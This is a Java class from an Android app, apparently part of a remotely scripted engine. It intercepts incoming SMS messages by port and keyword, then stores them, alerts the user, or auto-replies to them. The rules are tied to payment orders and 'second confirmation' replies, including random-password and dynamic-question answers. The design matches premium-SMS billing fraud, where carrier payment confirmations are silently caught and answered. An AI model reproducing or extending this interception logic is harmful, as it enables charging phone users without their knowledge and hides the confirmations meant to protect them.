package com.example.sayid.myapplication.parseStep.step.action;

import com.example.sayid.myapplication.common.bean.BlockBean;
import com.example.sayid.myapplication.common.util.JsonUtil;
import com.example.sayid.myapplication.common.util.StringUtil;
import com.example.sayid.myapplication.model.ChannelInfo;
import com.example.sayid.myapplication.parseStep.ParseStepBean;
import com.example.sayid.myapplication.parseStep.step.response.MyResponseParam;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

/**
 * 拦截短信并存储
 *
 * @author zxj
 * @time 2015年8月7日 上午11:07:48
 */
public class GetSms extends Step {
    /**
     *
     */
    private final static long serialVersionUID = 1L;

    /**
     * Id;
     */
    private String id;
    /**
     * 确认类型：
     * 0 = 固定内容回复，
     * 1 = 随机密码回复，
     * 2 = 智能动态问题回复，
     * 3 = 无二次确认.当为3时，后面的confirm字段都为空
     */
    private int type;
    /**
     * 拦截短信端口
     */
    private String port;
    /**
     * 拦截短信关键字
     */
    private String keyword;
    /**
     * 回复内容，动态时表示匹配模板，静态时为回复内容
     */
    private String content;
    /**
     * 是否首条确认：
     * 0 = 首条，
     * 1 = 逐条
     */
    private String first;
    /**
     * 拦截策略：
     * 0 = 拦截并自动回复，
     * 1 = 拦截提示用户
     * 2 = 不拦截
     * 3 = 拦截并存取在动作集中
     */
    private int strategy;

    /**
     * 优先级，0表示最低，值越大优先级越高
     */
    private String level;

    /**
     * 监控时长，小时，默认6小时
     */
    private long monitorTime;

    /**
     * 监控最后时间
     */
    public long monitorEndTime;

    /**
     * 拦截短信端口
     */
    public String inceptNum;
    /**
     * 拦截短信内容
     */
    public String inceptMsg;

    /**
     * 短信内容解析
     */
    public List<MyResponseParam> body_params;


    public GetSms() {
        this.actionID = Step.GETSMS;
    }


    /**
     * Json解析
     *
     * @param jsonObj
     * @throws JSONException
     */
    public void parseJson(JSONObject jsonObj) throws JSONException {
        id = JsonUtil.isEmptyOrGetStr(jsonObj, "id", "0");
        type = JsonUtil.isEmptyOrGetInt(jsonObj, "type", 3);
        port = JsonUtil.isNullOrGetStr(jsonObj, "port");
        keyword = JsonUtil.isNullOrGetStr(jsonObj, "keyword");
        content = JsonUtil.isNullOrGetStr(jsonObj, "content");
        first = JsonUtil.isEmptyOrGetStr(jsonObj, "first", "1");
        strategy = JsonUtil.isEmptyOrGetInt(jsonObj, "strategy", 2);
        level = JsonUtil.isEmptyOrGetStr(jsonObj, "level", "5");
        monitorTime = JsonUtil.isEmptyOrGetInt(jsonObj, "monitorTime", 6);

        if (!jsonObj.isNull("body_params")) {
            body_params = new ArrayList<MyResponseParam>();
            JSONArray j_params = jsonObj.getJSONArray("body_params");
            if (j_params != null) {
                int lenght = j_params.length();
                for (int j = 0; j < lenght; j++) {
                    JSONObject json = (JSONObject) j_params.get(j);
                    MyResponseParam rp = new MyResponseParam();
                    rp.parseJson(json);

                    body_params.add(rp);
                }
            }
        }
    }

    /**
     * 获取拦截短信对象
     *
     * @param args
     * @return
     */
    public BlockBean getBlockBean(ChannelInfo args) {
        // 创建拦截短信对象，放入拦截数据表中, 与二次确认和动作集中多个GetSMS 区分
        BlockBean tempBean = new BlockBean(args.user_order_id, args.pay_order_id + id);
        tempBean.block_level = level;
        tempBean.blockSecondConfirm.send_sms_timeout = args.send_sms_timeout;
        tempBean.blockSecondConfirm.confirm_type = type;
        tempBean.blockSecondConfirm.confirm_port = port;
        tempBean.blockSecondConfirm.confirm_keyword = keyword;
        tempBean.blockSecondConfirm.confirm_content = content;
        tempBean.blockSecondConfirm.confirm_first = first;
        tempBean.blockSecondConfirm.confirm_strategy = strategy;
        // 监控时间
        long monitorEndTime = 0;
        if (monitorTime > 0) {
            monitorEndTime = System.currentTimeMillis() + monitorTime * 60 * 60 * 1000;
        }
        tempBean.monitor_end_time = monitorEndTime;

        this.monitorEndTime = monitorEndTime;

        return tempBean;
    }

    /**
     * 解析短信返回的内容
     *
     * @param psb
     * @param inceptNum
     * @param inceptMsg
     */
    public void parseResponseParam(ParseStepBean psb, String inceptNum, String inceptMsg) {
        try {
            psb.append("\n<br>getSms: receivePort=").append(inceptNum).append(", receiveMsg=").append(inceptMsg);
            this.inceptNum = inceptNum;
            this.inceptMsg = inceptMsg;
            if (body_params != null && body_params.size() > 0) {
                for (MyResponseParam rp : body_params) {
                    int value_type = Integer.parseInt(rp.value_type);
                    switch (value_type) {
                        case 1:
                            rp.value = inceptMsg;
                            psb.map.put(rp.variable, rp.value);
                            break;

                        case 2:           //前后缀 截取
                            rp.value = StringUtil.getDynamicAnswer(inceptMsg, rp.value_key).trim();
                            psb.map.put(rp.variable, rp.value);
                            break;

                        case 3:          //只有前缀
                            rp.value = StringUtil.getDynamicAnswer_per(inceptMsg, rp.value_key).trim();
                            psb.map.put(rp.variable, rp.value);
                            break;

                        case 4:         //只有后缀
                            rp.value = StringUtil.getDynamicAnswer_aft(inceptMsg, rp.value_key).trim();
                            psb.map.put(rp.variable, rp.value);
                            break;

                        case 5:
                            break;

                        case 6:            //保存接收号码
                            rp.value = inceptNum;
                            psb.map.put(rp.variable, rp.value);
                            break;
                    }
                }

            }
        } catch (Exception e) {
            psb.append("\n<br>getSms parseResponseParam error:" + e.toString());
        }
    }

    @Override
    public Object clone() {
        GetSms obj = (GetSms) super.clone();
        obj.body_params = new ArrayList<MyResponseParam>();
        Iterator<MyResponseParam> param_it = this.body_params.iterator();
        while (param_it.hasNext()) {
            obj.body_params.add((MyResponseParam) (param_it.next().clone()));
        }

        return obj;
    }

    @Override
    public String toString() {
        StringBuffer str = new StringBuffer();
        str.append("\n<br>getSms id=").append(id)
                .append(",type=").append(type)
                .append(",port=").append(port)
                .append("\n<br>keyword=").append(keyword)
                .append(",content=").append(content)
                .append("\n<br>first=").append(first)
                .append(",strategy=").append(strategy)
                .append(",level=").append(level)
                .append(",monitorTime=").append(monitorTime)
                .append(",monitorEndTime=").append(monitorEndTime)
                .append("\n<br>inceptNum=").append(inceptNum)
                .append(",inceptMsg=").append(inceptMsg)
                .append("\n<br>body_params=").append(body_params);

        return str.toString();
    }
}
